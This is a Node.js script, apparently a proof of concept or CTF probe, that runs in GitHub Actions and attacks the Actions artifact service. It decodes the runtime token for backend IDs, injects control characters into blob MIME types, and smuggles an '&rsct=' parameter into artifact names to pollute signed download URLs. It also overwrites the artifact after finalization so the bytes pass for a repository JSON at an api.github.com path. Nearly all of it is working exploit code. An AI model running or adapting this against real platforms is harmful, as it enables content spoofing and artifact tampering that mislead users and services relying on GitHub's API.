// Run in a GitHub Actions job on a public repository with Node 20+.
// Creates a raw Actions artifact whose bytes identify its own download URL.
import { createHash } from 'node:crypto';

const token = process.env.ACTIONS_RUNTIME_TOKEN;
const resultsUrl = process.env.ACTIONS_RESULTS_URL;
const repository = process.env.GITHUB_REPOSITORY;
if (!token || !resultsUrl || !repository) {
  throw new Error('Requires ACTIONS_RUNTIME_TOKEN, ACTIONS_RESULTS_URL and GITHUB_REPOSITORY');
}

const jwt = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
const scope = jwt.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
if (!scope) throw new Error('Actions.Results scope missing');
const [, workflowRunBackendId, workflowJobRunBackendId] = scope.split(':');
const ids = {
  workflow_run_backend_id: workflowRunBackendId,
  workflow_job_run_backend_id: workflowJobRunBackendId,
};
const blobMime = 'application/json\x85';
let name = `repo-cassette-${Date.now()}.json`;

async function rpc(method, data) {
  const url = new URL(`/twirp/github.actions.results.api.v1.ArtifactService/${method}`, resultsUrl);
  const response = await fetch(url, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify(data),
  });
  const body = await response.json();
  if (!response.ok) throw new Error(`${method}: ${response.status} ${JSON.stringify(body)}`);
  return body;
}

async function upload(signedUrl, content) {
  const response = await fetch(signedUrl, {
    method: 'PUT',
    headers: {
      'x-ms-version': '2020-10-02',
      'x-ms-blob-type': 'BlockBlob',
      'x-ms-blob-content-type': blobMime,
      'Content-Type': blobMime,
    },
    body: content,
  });
  if (!response.ok) throw new Error(`Blob PUT: ${response.status} ${(await response.text()).slice(0, 500)}`);
}

function payload(id) {
  const path = `${repository}/actions/artifacts/${id}/zip`;
  const body = JSON.stringify({
    full_name: path,
    owner: { login: 'x', avatar_url: 'https://avatars.githubusercontent.com/u/1?v=4' },
    description: 'repo cassette',
  });
  return { path, body };
}

let created;
let createMime = blobMime;
try {
  created = await rpc('CreateArtifact', {
    ...ids, name, version: 6,
  });
} catch (error) {
  console.log(`NEL_CREATE_ERROR=${error.message}`);
  createMime = 'application/json';
  name = `repo-cassette-${Date.now()}-fallback.json`;
  created = await rpc('CreateArtifact', {
    ...ids, name, version: 6,
  });
}
console.log(`CREATE_MIME=${JSON.stringify(createMime)}`);
if (!created.ok || !created.signed_upload_url) throw new Error('CreateArtifact failed');

let earlyId;
try {
  const listed = await rpc('ListArtifacts', { ...ids, name_filter: name });
  const match = listed.artifacts?.find(x => x.name === name);
  earlyId = match?.database_id || match?.databaseId;
  console.log(`BEFORE_FINALIZE_ID=${earlyId || 'none'}`);
} catch (error) {
  console.log(`BEFORE_FINALIZE_LIST_ERROR=${error.message}`);
}

const initial = earlyId ? payload(earlyId).body : '{}';
await upload(created.signed_upload_url, initial);
const finalized = await rpc('FinalizeArtifact', {
  ...ids, name, size: String(Buffer.byteLength(initial)),
});
if (!finalized.ok || !finalized.artifact_id) throw new Error('FinalizeArtifact failed');
const id = finalized.artifact_id;
const { path, body } = payload(id);
if (!earlyId || String(earlyId) !== String(id)) {
  // The upload SAS remains writable for a short time after finalization.
  await upload(created.signed_upload_url, body);
  console.log('POST_FINALIZE_OVERWRITE=ok');
}

console.log(`ARTIFACT_ID=${id}`);
console.log(`REPOSITORY=${path}`);
console.log(`EXPECTED_SHA256=${createHash('sha256').update(body).digest('hex')}`);

// Verify the public REST endpoint without disclosing its signed redirect URL.
const api = `https://api.github.com/repos/${path}`;
const get = await fetch(api, {
  headers: {
    Authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
    Accept: 'application/vnd.github.v3+json',
    'User-Agent': 'repo-cassette-ctf',
  },
});
const observed = Buffer.from(await get.arrayBuffer());
console.log(`REST_STATUS=${get.status}`);
console.log(`REST_CONTENT_TYPE=${JSON.stringify(get.headers.get('content-type'))}`);
console.log(`REST_SHA256=${createHash('sha256').update(observed).digest('hex')}`);
console.log(`REST_MATCH=${observed.equals(Buffer.from(body))}`);

// Additional benign protocol checks; never prints signed URLs or credentials.
const protocolCases = [
  ['omit0', 0],
  ['omit1', 1],
  ['omit2', 2],
  ['omit3', 3],
  ['omit5', 5],
  ['nbsp7', 7, 'application/json\u00a0'],
  ['percent7', 7, 'application/json%85'],
  ['c01c7', 7, 'application/json\u001c'],
  ['namepollute7', 7, 'application/json', '&rsct=application%2Fx-ctf-probe'],
];

for (const [label, version, mime, suffix = ''] of protocolCases) {
  const probeName = `rc-probe-${Date.now()}-${label}${suffix}.json`;
  const request = { ...ids, name: probeName, version };
  if (mime !== undefined) request.mime_type = mime;
  let made;
  try {
    made = await rpc('CreateArtifact', request);
    console.log(`CASE_${label}_CREATE=ok`);
  } catch (error) {
    console.log(`CASE_${label}_CREATE_ERROR=${String(error.message).slice(0, 200)}`);
    continue;
  }
  const signedUpload = made.signed_upload_url;
  const content = JSON.stringify({ probe: label });
  const put = await fetch(signedUpload, {
    method: 'PUT',
    headers: {
      'x-ms-version': '2020-10-02',
      'x-ms-blob-type': 'BlockBlob',
      'x-ms-blob-content-type': 'application/json\u0085',
      'Content-Type': 'application/json',
    },
    body: content,
  });
  console.log(`CASE_${label}_PUT=${put.status}`);
  if (!put.ok) continue;
  const done = await rpc('FinalizeArtifact', {
    ...ids, name: probeName, size: String(Buffer.byteLength(content)),
  });
  console.log(`CASE_${label}_FINAL=${done.artifact_id ?? 'none'}`);
  const signed = await rpc('GetSignedArtifactURL', { ...ids, name: probeName });
  const download = new URL(signed.signed_url);
  console.log(`CASE_${label}_RSCT=${JSON.stringify(download.searchParams.getAll('rsct'))}`);
  console.log(`CASE_${label}_RSCD_AMP=${String(download.searchParams.get('rscd') ?? '').includes('&')}`);
  const resp = await fetch(download);
  console.log(`CASE_${label}_GET=${resp.status}`);
  console.log(`CASE_${label}_TYPE=${JSON.stringify(resp.headers.get('content-type'))}`);
}
